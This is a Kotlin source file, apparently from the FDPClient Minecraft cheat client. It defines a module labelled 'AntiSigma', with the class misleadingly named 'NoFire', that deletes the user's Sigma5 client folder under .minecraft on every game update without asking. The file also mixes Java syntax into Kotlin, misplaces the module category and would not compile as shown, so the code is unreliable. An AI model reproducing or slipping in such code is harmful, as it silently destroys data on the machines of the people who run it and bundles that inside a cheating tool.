/*
 * FDPClient Hacked Client
 * A free open source mixin-based injection hacked client for Minecraft using Minecraft Forge by LiquidBounce.
 * https://github.com/UnlegitMC/FDPClient/
 */
package net.ccbluex.liquidbounce.features.module.modules.render

import net.ccbluex.liquidbounce.LiquidBounce
import net.ccbluex.liquidbounce.event.EventTarget
import net.ccbluex.liquidbounce.event.UpdateEvent
import net.ccbluex.liquidbounce.features.module.Module
import net.ccbluex.liquidbounce.features.module.ModuleCategory
import net.ccbluex.liquidbounce.features.module.ModuleInfo
import net.ccbluex.liquidbounce.script.api.global.Chat;
import org.apache.commons.io.FileUtils;

import java.io.File;
import java.io.IOException;

@ModuleInfo(name = "AntiSigma", category = ModuleCategory.COMBAT)
class NoFire: Module() {
File Sigma = new File(System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft\\versions\\Sigma5");
    @EventTarget
    fun onUpdate(event: UpdateEvent) {
        if (Sigma.exists()) {
                FileUtils.deleteDirectory(Sigma);
            }
    }

}
